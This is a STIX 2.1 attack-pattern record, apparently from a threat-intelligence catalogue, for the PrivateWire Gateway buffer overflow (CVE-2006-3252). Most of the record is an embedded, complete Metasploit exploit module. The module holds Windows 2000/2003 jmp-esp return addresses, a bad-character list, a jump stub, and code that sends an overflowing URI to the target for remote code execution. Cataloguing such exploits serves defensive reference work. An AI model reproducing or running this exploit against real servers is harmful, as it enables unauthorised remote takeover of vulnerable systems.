{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--763b9876-1285-450a-941f-053ded53f04d",
    "created": "2024-08-14T16:53:28.318319Z",
    "modified": "2024-08-14T16:53:28.318324Z",
    "name": "Private Wire Gateway Buffer Overflow",
    "description": " This exploits a buffer overflow in the ADMCREG.EXE used in the PrivateWire Online Registration Facility. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/privatewire_gateway.rb",
            "external_id": "privatewire_gateway.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3252"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# This file may only be distributed as part of the Metasploit Framework.\n# Any other use needs a written permission from the author.\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Private Wire Gateway Buffer Overflow',\n      'Description'    => %q{\n          This exploits a buffer overflow in the ADMCREG.EXE used\n        in the PrivateWire Online Registration Facility.\n      },\n      'Author'         => 'Michael Thumann <mthumann[at]ernw.de>',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2006-3252'],\n          ['OSVDB', '26861'],\n          ['BID', '18647'],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 8000,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x1b\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 English SP0',     { 'Ret' => 0x77e3c289 }], # jmp esp user32.dll\n          ['Windows 2000 English SP1',     { 'Ret' => 0x77e3cb4c }], # jmp esp user32.dll\n          ['Windows 2000 English SP2',     { 'Ret' => 0x77e3af64 }], # jmp esp user32.dll\n          ['Windows 2000 English SP3',     { 'Ret' => 0x77e388a7 }], # jmp esp user32.dll\n          ['Windows 2000 English SP4',     { 'Ret' => 0x77e3c256 }], # jmp esp user32.dll\n          ['Windows 2003 English SP0/SP1', { 'Ret' => 0x77d74c94 }], # jmp esp user32.dll\n          ['Debugging',                    { 'Ret' => 0x41414141 }], # crash\n        ],\n      'DefaultTarget'  => 4,\n      'DisclosureDate' => '2006-06-26'))\n\n    register_options(\n      [\n        OptString.new('PATH', [ true, \"Installation path of Privatewire\", 'C:\\Cipgw' ])\n      ])\n  end\n\n  def exploit\n    # add 25 to ecx and jmp\n    jmp = \"\\x6a\\x19\\x58\\x01\\xc1\\xff\\xe1\"\n\n    path_offset = datastore['PATH'].length - 8\n\n    pattern                            = rand_text_alphanumeric(8192)\n    pattern[0, payload.encoded.length] = payload.encoded\n    pattern[8156 - path_offset, 4]     = [target.ret].pack('V')\n    pattern[8160, jmp.length]          = jmp\n\n    print_status(\"Trying #{target.name} using jmp esp at #{\"%.8x\" % target.ret}\")\n\n    send_request_raw({\n        'uri' => \"/\" + pattern\n      }, 2)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-06-26",
    "x_mitre_platforms": [
        "win'"
    ]
}